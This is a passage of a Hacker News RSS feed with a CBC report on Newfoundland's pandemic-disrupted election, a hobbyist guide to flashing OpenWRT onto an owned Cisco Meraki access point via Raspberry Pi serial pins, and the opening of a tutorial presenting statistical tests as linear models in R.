460w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/andrew-furey-wearing-liberal-red-mask.jpg 620w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/andrew-furey-wearing-liberal-red-mask.jpg 780w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/andrew-furey-wearing-liberal-red-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/andrew-furey-wearing-liberal-red-mask.jpg"></p></div><figcaption>Premier Andrew Furey called the Feb. 13 election last month, and has faced rising criticism over his choice of timing.<!-- --> <!-- -->(Paul Daly)</figcaption></figure></span></p>  <p>The embattled election hasn't weathered the outbreak well,&nbsp;with poll workers resigning en masse,&nbsp;delaying election day for the province's most populated region.</p>  <p>Liberal Leader Andrew Furey, campaigning to reinstate himself in the premier's chair, has repeatedly come under fire for triggering an election prior to widespread vaccine availability.&nbsp;</p>  <p>Furey was compelled by law to call an election within a year of taking over as the head of the Liberal Party, with his deadline in August. When he dropped the writ in January, the province had a steadily low caseload.</p>  <p>As the outbreak worsened this week, Furey repeatedly defended his election timing.</p>  <p>"I haven't given much thought to the election," Furey said Friday evening, prior to Chaulk's announcement and just as news broke of B117's arrival. "I understand there are questions about the election ‚Ä¶ but we don't have the answers."</p>  <h2>Accountability ahead: opponents</h2>  <p>Fitzgerald said she has spoken with the province's chief electoral officer&nbsp;but would not disclose the advice she gave him when pressed during the briefing, saying it's not her jurisdiction.</p>  <p>Furey's opponents had been calling for an election delay this week&nbsp;and applauded the decision to move to special ballots. NDP Leader Alison Coffin expressed concern, however, that some people may face barriers&nbsp;in registering for mail-in voting by Monday.</p>  <p>"We may see some court challenges come from this," Coffin said. "What I'm more concerned about is how irresponsible Andrew Furey's actions were."</p>  <p>Progressive Conservative Leader Ches Crosbie declined an interview&nbsp;but said in a statement his party would discuss Furey's election timing "another day," saying the public health emergency is the&nbsp;priority.</p>  <p>"Our province deserves a thoughtful conversation about why it took so long for us to reach the right decision in postponing this election and how we hold our political leaders accountable," the statement read.</p>    <p>Earlier on Friday, officials reported 50 new cases of COVID-19, with the vast majority in the St. John's metro region. The province has reported&nbsp;higher-than-average new cases since Monday, when rampant community spread was first identified.</p>  <p>Thousands of people are now in isolation, including 300 health-care workers.</p>  <p><em><strong><a href="https://www.cbc.ca/news/canada/newfoundland-labrador">Read more from CBC Newfoundland and Labrador</a></strong></em></p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121658</guid>
            <pubDate>Sat, 13 Feb 2021 05:34:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[People who survived the impossible (2020)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26121655">thread link</a>) | @chetangoti
<br/>
February 12, 2021 | https://www.nowyouknowstuff.com/danger%e2%98%a0%ef%b8%8f/people-who-survived-the-impossible/ | <a href="https://web.archive.org/web/*/https://www.nowyouknowstuff.com/danger%e2%98%a0%ef%b8%8f/people-who-survived-the-impossible/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.nowyouknowstuff.com/danger%e2%98%a0%ef%b8%8f/people-who-survived-the-impossible/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121655</guid>
            <pubDate>Sat, 13 Feb 2021 05:33:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Flash OpenWRT on Cisco Meraki AP]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26121518">thread link</a>) | @AJAlabs
<br/>
February 12, 2021 | https://roamingviews.com/tech/how-to-flash-openwrt-on-cisco-meraki/ | <a href="https://web.archive.org/web/*/https://roamingviews.com/tech/how-to-flash-openwrt-on-cisco-meraki/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>If you have a Cisco Meraki AP with an expired cloud license, its pretty much useless. However, if you have a RaspberryPi, some wires, and some patience you can pretty easily Flash <a href="https://openwrt.org/">OpenWRT</a> on Cisco Meraki. </p>
<p><em>Disclaimer : This voids your warranty and Meraki subscription so best done on decommissioned units that have not been updated in awhile. May not work on new units.</em> </p>
<h2>Things You‚Äôll Need </h2>
<ol><li>Cisco Meraki MR33 AP (can be done on other models with serial pins) </li><li>RaspberryPi with GPIO Board + Monitor + Keyboard + Mouse </li><li>Three Pin-To-Pin jumper wires (can be salvaged from old IDE cables) </li><li>Ethernet Cable </li><li>Torx Screwdriver and a pry tool </li><li>A Laptop and this Google Drive <a href="https://drive.google.com/drive/folders/1jJa8LzYnY830v3nBZdOgAk0YQK6OdbSS">Link</a> (contains the files we need) </li></ol>
<h2>Flash OpenWRT on Cisco Meraki </h2>
<p>First, remove the 4 screws (behind the rubber stoppers) on the grey underside of the AP, then pry it apart at the seams. </p>
<p><strong>Step 1 :</strong> There are 4 screws behind the rubber ‚Äòfeet‚Äô on the grey side of the AP. Undo them, then pop the AP apart by using a plastic or metal knife. </p>
<figure><img loading="lazy" src="https://roamingviews.com/wp-content/uploads/2021/02/image-1.png" alt="" width="374" height="578" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-1.png 499w, https://roamingviews.com/wp-content/uploads/2021/02/image-1-194x300.png 194w" sizes="(max-width: 374px) 85vw, 374px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-1.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-1.png 499w, https://roamingviews.com/wp-content/uploads/2021/02/image-1-194x300.png 194w"></figure>

<p><strong>Step 2 : </strong>On your RaspberryPi download all of the files in the Google Drive. Extract them with a ZIP tool, then put them in a folder. </p>
<figure><img loading="lazy" width="634" height="148" src="https://roamingviews.com/wp-content/uploads/2021/02/image-2.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-2.png 634w, https://roamingviews.com/wp-content/uploads/2021/02/image-2-300x70.png 300w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-2.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-2.png 634w, https://roamingviews.com/wp-content/uploads/2021/02/image-2-300x70.png 300w"></figure>
<p><strong>Step 3 : </strong>Enable Serial GPIO on the RaspberryPi by typing ‚Äúraspi-config‚Äô navigating to <strong>Interfaces -&gt; Serial -&gt; Prompt 1 Hit NO -&gt; Prompt 2 Hit YES</strong>-&gt; You will see a confirmation , hit <strong>OK -&gt; Hit Finish (bottom right)</strong></p>
<figure><img loading="lazy" width="639" height="413" src="https://roamingviews.com/wp-content/uploads/2021/02/image-3.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-3.png 639w, https://roamingviews.com/wp-content/uploads/2021/02/image-3-300x194.png 300w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-3.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-3.png 639w, https://roamingviews.com/wp-content/uploads/2021/02/image-3-300x194.png 300w"></figure>
<p>This will enable the Serial on the GPIO pins which run across the side of the raspberrypi , to figure out your serial interface d0 the following command :</p>
<figure><img loading="lazy" width="640" height="72" src="https://roamingviews.com/wp-content/uploads/2021/02/image-4.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-4.png 640w, https://roamingviews.com/wp-content/uploads/2021/02/image-4-300x34.png 300w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-4.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-4.png 640w, https://roamingviews.com/wp-content/uploads/2021/02/image-4-300x34.png 300w"></figure>
<p>Take note that we will use the ttyS0 interface </p>
<p><strong>Step 4 : </strong>Connect these GPIO serial pins on the RaspberryPi to 3 pins on the Meraki board. </p>
<figure><img loading="lazy" width="1024" height="437" src="https://roamingviews.com/wp-content/uploads/2021/02/image-5-1024x437.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-5-1024x437.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-5-300x128.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-5-768x328.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-5.png 1139w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-5-1024x437.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-5-1024x437.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-5-300x128.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-5-768x328.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-5.png 1139w"></figure>
<p><span>D0 NOT connect anything to the pin with the white arrow on it.</span></p>
<figure><img loading="lazy" width="1024" height="748" src="https://roamingviews.com/wp-content/uploads/2021/02/image-6-1024x748.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-6-1024x748.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-6-300x219.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-6-768x561.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-6.png 1154w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-6-1024x748.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-6-1024x748.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-6-300x219.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-6-768x561.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-6.png 1154w"></figure>

<p><strong>Step 5 : </strong>Now Launch the flashing script with the following command , you need to add the name of your serial interface with the <strong>‚Äìserial={interface path}</strong>. After the python script is running and you see ‚ÄúUploading image‚Äù then power on your AP to boot it ,<strong> be careful not to let the serial wires move or shift. </strong></p>
<p>If done correctly you should pretty instantly see the following output after booting the AP :</p>
<figure><img loading="lazy" width="992" height="628" src="https://roamingviews.com/wp-content/uploads/2021/02/image-7.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-7.png 992w, https://roamingviews.com/wp-content/uploads/2021/02/image-7-300x190.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-7-768x486.png 768w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-7.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-7.png 992w, https://roamingviews.com/wp-content/uploads/2021/02/image-7-300x190.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-7-768x486.png 768w"><figcaption>Wait a couple minutes for it to finish. <strong>If this fails, your AP may be on newer firmware which prevents this</strong>.</figcaption></figure>
<p><strong>Step 6 : </strong>One the upload is done. Connect an Ethernet cord to your AP from a laptop or the Pi , set your interface IP to <strong>192.168.1.2 </strong>and your gateway to <strong>192.168.1.1</strong> with a subnet mask of 255.255.255.0 and verify it works by pinging 192.168.1.1 , if you get a response port 21 should also be open.</p>
<p> Now Upload OpenWRT to the AP via TFTPD64 by hitting the PUT button :</p>
<figure><img loading="lazy" width="665" height="592" src="https://roamingviews.com/wp-content/uploads/2021/02/image-8.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-8.png 665w, https://roamingviews.com/wp-content/uploads/2021/02/image-8-300x267.png 300w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-8.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-8.png 665w, https://roamingviews.com/wp-content/uploads/2021/02/image-8-300x267.png 300w"></figure>
<p>The AP should now Reboot after this is uploaded, wait till pings return, now you can browse to http://192.168.1.1 and see the following or SSH to see OpenWRT! </p>
<figure><img loading="lazy" width="1024" height="656" src="https://roamingviews.com/wp-content/uploads/2021/02/image-9-1024x656.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-9-1024x656.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-9-300x192.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-9-768x492.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-9.png 1170w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-9-1024x656.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-9-1024x656.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-9-300x192.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-9-768x492.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-9.png 1170w"><figcaption>Login is root no password, do set a password once you login üôÇ </figcaption></figure>
<figure><img loading="lazy" width="1024" height="604" src="https://roamingviews.com/wp-content/uploads/2021/02/image-10-1024x604.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-10-1024x604.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-10-300x177.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-10-768x453.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-10.png 1040w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-10-1024x604.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-10-1024x604.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-10-300x177.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-10-768x453.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-10.png 1040w"></figure>

<p>Now use WinSCP to connect to the AP via SSH and transfer the .bin file to the AP</p>
<figure><img loading="lazy" width="1024" height="643" src="https://roamingviews.com/wp-content/uploads/2021/02/image-12-1024x643.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-12-1024x643.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-12-300x188.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-12-768x482.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-12.png 1170w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-12-1024x643.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-12-1024x643.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-12-300x188.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-12-768x482.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-12.png 1170w"></figure>

<p>Finally , You can reboot the AP to go back to Meraki or run this command which will install OpenWRT permanently üôÇ </p>
<figure><img loading="lazy" width="1024" height="39" src="https://roamingviews.com/wp-content/uploads/2021/02/image-11-1024x39.png" alt="" srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-11-1024x39.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-11-300x11.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-11-768x29.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-11.png 1108w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px" data-old-src="//roamingviews.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://roamingviews.com/wp-content/uploads/2021/02/image-11-1024x39.png" data-srcset="https://roamingviews.com/wp-content/uploads/2021/02/image-11-1024x39.png 1024w, https://roamingviews.com/wp-content/uploads/2021/02/image-11-300x11.png 300w, https://roamingviews.com/wp-content/uploads/2021/02/image-11-768x29.png 768w, https://roamingviews.com/wp-content/uploads/2021/02/image-11.png 1108w"></figure>
<p>This concludes how to flash OpenWRT on Cisco Meraki ! For more Tech articles click <a href="https://roamingviews.com/tech/">here</a>.</p>
</div></div>]]>
            </description>
            <link>https://roamingviews.com/tech/how-to-flash-openwrt-on-cisco-meraki/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121518</guid>
            <pubDate>Sat, 13 Feb 2021 04:58:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Common statistical tests are linear models]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26121457">thread link</a>) | @gballan
<br/>
February 12, 2021 | https://lindeloev.github.io/tests-as-linear/ | <a href="https://web.archive.org/web/*/https://lindeloev.github.io/tests-as-linear/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>








<!-- From https://stackoverflow.com/a/37839683/1297830 -->


<p>By Jonas Kristoffer Lindel√∏v (<a href="https://lindeloev.net/">blog</a>, <a href="http://personprofil.aau.dk/117060">profile</a>).<br> Last updated: 28 June, 2019 (See <a href="https://github.com/lindeloev/tests-as-linear/commits/master">changelog</a>).<br> Check out the <a href="https://eigenfoo.xyz/tests-as-linear/">Python version</a> and the <a href="https://twitter.com/jonaslindeloev/status/1110907133833502721">Twitter summary</a>.</p>
<!-- Social sharing. From simplesharebuttons.com -->



<p>This document is summarised in the table below. It shows the linear models underlying common parametric and ‚Äúnon-parametric‚Äù tests. Formulating all the tests in the same language highlights the many similarities between them. Get it <a href="https://lindeloev.github.io/tests-as-linear/linear_tests_cheat_sheet.png">as an image</a> or <a href="https://lindeloev.github.io/tests-as-linear/linear_tests_cheat_sheet.pdf">as a PDF</a>.</p>
<hr>
<p><a href="https://lindeloev.github.io/tests-as-linear/linear_tests_cheat_sheet.pdf"><img src="https://lindeloev.github.io/tests-as-linear/linear_tests_cheat_sheet.png"></a></p>
<hr>
<div id="the-simplicity-underlying-common-tests">

<p>Most of the common statistical models (t-test, correlation, ANOVA; chi-square, etc.) are special cases of linear models or a very close approximation. This beautiful simplicity means that there is less to learn. In particular, it all comes down to <span>\(y = a \cdot x + b\)</span> which most students know from highschool. Unfortunately, stats intro courses are usually taught as if each test is an independent tool, needlessly making life more complicated for students and teachers alike.</p>
<p>This needless complexity multiplies when students try to rote learn the parametric assumptions underlying each test separately rather than deducing them from the linear model.</p>
<p>For this reason, I think that teaching linear models first and foremost and <em>then</em> name-dropping the special cases along the way makes for an excellent teaching strategy, emphasizing <em>understanding</em> over rote learning. Since linear models are the same across frequentist, Bayesian, and permutation-based inferences, I‚Äôd argue that it‚Äôs better to start with modeling than p-values, type-1 errors, Bayes factors, or other inferences.</p>
<p>Concerning the teaching of <em>‚Äúnon-parametric‚Äù</em> tests in intro-courses, I think that we can justify <a href="https://en.wikipedia.org/wiki/Lie-to-children">lying-to-children</a> and teach ‚Äúnon-parametric‚Äù" tests as if they are merely ranked versions of the corresponding parametric tests. It is much better for students to think ‚Äúranks!‚Äù than to believe that you can magically throw away assumptions. Indeed, the Bayesian equivalents of ‚Äúnon-parametric‚Äù" tests implemented in <a href="https://jasp-stats.org/">JASP</a> <a href="https://arxiv.org/abs/1712.06941">literally just do (latent) ranking</a> and that‚Äôs it. For the frequentist ‚Äúnon-parametric‚Äù" tests considered here, this approach is highly accurate for N &gt; 15.</p>
<center>
<img src="https://www.picsellmedia.com/wp-content/uploads/2017/01/shutterstock_336913772.jpg">
</center>

<p>Use the menu to jump to your favourite section. There are links to lots of similar (though more scattered) stuff under <a href="#links">sources</a> and <a href="#course">teaching materials</a>. I hope that you will join in suggesting improvements or submitting improvements yourself in <a href="https://github.com/lindeloev/tests-as-linear">the Github repo to this page</a>. Let‚Äôs make it awesome!</p>
</div>
<div id="settings-and-toy-data">
<p>
Unfold this if you want to see functions and other settings for this notebook:
</p><div>
<pre><code># Load packages for data handling and plotting
library(tidyverse)
library(patchwork)
library(broom)

# Reproducible "random" results
set.seed(40)

# Generate normal data with known parameters
rnorm_fixed = function(N, mu = 0, sd = 1)
  scale(rnorm(N)) * sd + mu

# Plot style.
theme_axis = function(P,
                      jitter = FALSE,
                      xlim = c(-0.5, 2),
                      ylim = c(-0.5, 2),
                      legend.position = NULL) {
  P = P + theme_bw(15) +
    geom_segment(
      x = -1000, xend = 1000,
      y = 0, yend = 0,
      lty = 2, color = 'dark gray', lwd = 0.5
    ) +
    geom_segment(
      x = 0, xend = 0,
      y = -1000, yend = 1000,
      lty = 2, color = 'dark gray', lwd = 0.5
    ) +
    coord_cartesian(xlim = xlim, ylim = ylim) +
    theme(
      axis.title = element_blank(),
      axis.text = element_blank(),
      axis.ticks = element_blank(),
      panel.border = element_blank(),
      panel.grid = element_blank(),
      legend.position = legend.position
    )
  
  # Return jittered or non-jittered plot?
  if (jitter) {
    P + geom_jitter(width = 0.1, size = 2)
  }
  else {
    P + geom_point(size = 2)
  }
}</code></pre>
</div>
<p>For a start, we‚Äôll keep it simple and play with three standard normals in wide (<code>a</code>, <code>b</code>, <code>c</code>) and long format (<code>value</code>, <code>group</code>):</p>
<pre><code># Wide format (sort of)
#y = rnorm_fixed(50, mu=0.3, sd=2)  # Almost zero mean.
y = c(rnorm(15), exp(rnorm(15)), runif(20, min = -3, max = 0))  # Almost zero mean, not normal
x = rnorm_fixed(50, mu = 0, sd = 1)  # Used in correlation where this is on x-axis
y2 = rnorm_fixed(50, mu = 0.5, sd = 1.5)  # Used in two means

# Long format data with indicator
value = c(y, y2)
group = rep(c('y1', 'y2'), each = 50)</code></pre>
</div>
<div id="correlation">

<div id="theory-as-linear-models">
<h3> Theory: As linear models</h3>
<p>Model: the recipe for <span>\(y\)</span> is a slope (<span>\(\beta_1\)</span>) times <span>\(x\)</span> plus an intercept (<span>\(\beta_0\)</span>, aka a straight line).</p>
<p><span>\(y = \beta_0 + \beta_1 x \qquad \mathcal{H}_0: \beta_1 = 0\)</span></p>
<p>‚Ä¶ which is a math-y way of writing the good old <span>\(y = ax + b\)</span> (here ordered as <span>\(y = b + ax\)</span>). In R we are lazy and write <code>y ~ 1 + x</code> which R reads like <code>y = 1*number + x*othernumber</code> and the task of t-tests, lm, etc., is simply to find the numbers that best predict <span>\(y\)</span>.</p>
<p>Either way you write it, it‚Äôs an intercept (<span>\(\beta_0\)</span>) and a slope (<span>\(\beta_1\)</span>) yielding a straight line:</p>
<div>
<pre><code># Fixed correlation
D_correlation = data.frame(MASS::mvrnorm(30, mu = c(0.9, 0.9), Sigma = matrix(c(1, 0.8, 1, 0.8), ncol = 2), empirical = TRUE))  # Correlated data

# Add labels (for next plot)
D_correlation$label_num = sprintf('(%.1f,%.1f)', D_correlation$X1, D_correlation$X2)
D_correlation$label_rank = sprintf('(%i,%i)', rank(D_correlation$X1), rank(D_correlation$X2))

# Plot it
fit = lm(I(X2 * 0.5 + 0.4) ~ I(X1 * 0.5 + 0.2), D_correlation)
intercept_pearson = coefficients(fit)[1]

P_pearson = ggplot(D_correlation, aes(x=X1*0.5+0.2, y=X2*0.5+0.4)) +
  geom_smooth(method=lm, se=FALSE, lwd=2, aes(colour='beta_1')) + 
  geom_segment(x=-100, xend=100, 
               y=intercept_pearson, yend=intercept_pearson, 
               lwd=2, aes(color="beta_0")) + 
  scale_color_manual(name=NULL, values=c("blue", "red"), labels=c(bquote(beta[0]*" (intercept)"), bquote(beta[1]*" (slope)")))
  
theme_axis(P_pearson, legend.position = c(0.4, 0.9))</code></pre>
<p><img src="https://lindeloev.github.io/tests-as-linear/index_files/figure-html/unnamed-chunk-4-1.png" width="576"></p>
</div>
<p>This is often simply called a <strong>regression</strong> model which can be extended to <strong>multiple regression</strong> where there are several <span>\(\beta\)</span>s and on the right-hand side multiplied with the predictors. Everything below, from <a href="#t1">one-sample t-test</a> to <a href="#anova2">two-way ANOVA</a> are just special cases of this system. Nothing more, nothing less.</p>
<p>As the name implies, the <strong>Spearman rank correlation</strong> is a <strong>Pearson correlation</strong> on rank-transformed <span>\(x\)</span> and <span>\(y\)</span>:</p>
<p><span>\(rank(y) = \beta_0 + \beta_1 \cdot rank(x) \qquad \mathcal{H}_0: \beta_1 = 0\)</span></p>
<p>I‚Äôll introduce <a href="#rank">ranks</a> in a minute. For now, notice that the correlation coefficient of the linear model is identical to a ‚Äúreal‚Äù Pearson correlation, but p-values are an approximation which is is <a href="https://lindeloev.github.io/tests-as-linear/simulations/simulate_spearman.html">appropriate for samples greater than N=10 and almost perfect when N &gt; 20</a>.</p>
<p>Such a nice and non-mysterious equivalence that many students are left unaware of! Visualizing them side by side including data labels, we see this rank-transformation in action:</p>
<div>
<pre><code># Spearman intercept
intercept_spearman = coefficients(lm(rank(X2) ~ rank(X1), D_correlation))[1]

# Spearman plot
P_spearman = ggplot(D_correlation, aes(x=rank(X1), y=rank(X2))) +
  geom_smooth(method=lm, se=FALSE, lwd=2, aes(color='beta_1')) + 
  geom_text(aes(label=label_rank), nudge_y=1, size=3, color='dark gray') + 
  geom_segment(x=-100, xend=100, 
               y=intercept_spearman, yend=intercept_spearman, 
               lwd=2, aes(color='beta_0')) + 
  scale_color_manual(name=NULL, values=c("blue", "red"), labels=c(bquote(beta[0]*" (intercept)"), bquote(beta[1]*" (slope)")))

# Stich together using patchwork
(theme_axis(P_pearson, legend.position=c(0.5, 0.1)) + geom_text(aes(label=label_num), nudge_y=0.1, size=3, color='dark gray') + labs(title='         Pearson')) + (theme_axis(P_spearman, xlim=c(-7.5, 30), ylim=c(-7.5, 30), legend.position=c(0.5, 0.1)) + labs(title='         Spearman'))</code></pre>
<p><img src="https://lindeloev.github.io/tests-as-linear/index_files/figure-html/unnamed-chunk-5-1.png" width="768"></p>
</div>
</div>
<div id="rank">
<h3> Theory: rank-transformation</h3>
<p><code>rank</code> simply takes a list of numbers and ‚Äúreplace‚Äù them with the integers of their rank (1st smallest, 2nd smallest, 3rd smallest, etc.). So the result of the rank-transformation <code>rank(c(3.6, 3.4, -5.0, 8.2))</code> is <code>3, 2, 1, 4</code>. See that in the figure above?</p>
<p>A <em>signed</em> rank is the same, just where we rank according to absolute size first and then add in the sign second. So the signed rank here would be <code>2, 1, -3, 4</code>. Or in code:</p>
<pre><code>signed_rank = function(x) sign(x) * rank(abs(x))</code></pre>
<p>I hope I don‚Äôt offend anyone when I say that ranks are easy; yet it‚Äôs all you need to do to convert most parametric tests into their ‚Äúnon-parametric‚Äù counterparts! One interesting implication is that <em>many ‚Äúnon-parametric tests‚Äù are about as parametric as their parametric counterparts with means, standard deviations, homogeneity of variance, etc. - just on rank-transformed data</em>. That‚Äôs why I put ‚Äúnon-parametric‚Äù in quotation marks.</p>
</div>
<div id="r-code-pearson-correlation">
<h3> R code: Pearson correlation</h3>
<p>It couldn‚Äôt be much simpler to run these models in R. They yield identical <code>p</code> and <code>t</code>, but there‚Äôs a catch: <code>lm</code> gives you the <em>slope</em> and even though that is usually much more interpretable and informative than the <em>correlation coefficient</em> <em>r</em>, you may still want <em>r</em>. Luckily, the slope becomes <code>r</code> if <code>x</code> and <code>y</code> have identical standard deviations. For now, we will use <code>scale(x)</code> to make <span>\(SD(x) = 1.0\)</span> and <span>\(SD(y) = 1.0\)</span>:</p>
<pre><code>a = cor.test(y, x, method = "pearson") # Built-in
b = lm(y ~ 1 + x) # Equivalent linear model: y = Beta0*1 + Beta1*x
c = lm(scale(y) ~ 1 + scale(x))  # On scaled vars to recover r</code></pre><p>
Results: </p>

<div>
<pre><code>## 
##  Pearson's product-moment correlation
## 
## data:  y and x
## t = -0.33651, df = 48, p-value = 0.738
## alternative hypothesis: true correlation is not equal to 0
## 95 percent confidence interval:
##  -0.3225066  0.2329799
## sample estimates:
##         cor 
## -0.04851394 
## 
## 
## Call:
## lm(formula = y ~ 1 + x)
## 
## Residuals:
##     Min      1Q  Median      3Q     Max 
## -2.6265 -1.1753 -0.3718  0.6607  5.7109 
## 
## Coefficients:
##             Estimate Std. Error t value Pr(&gt;|t|)
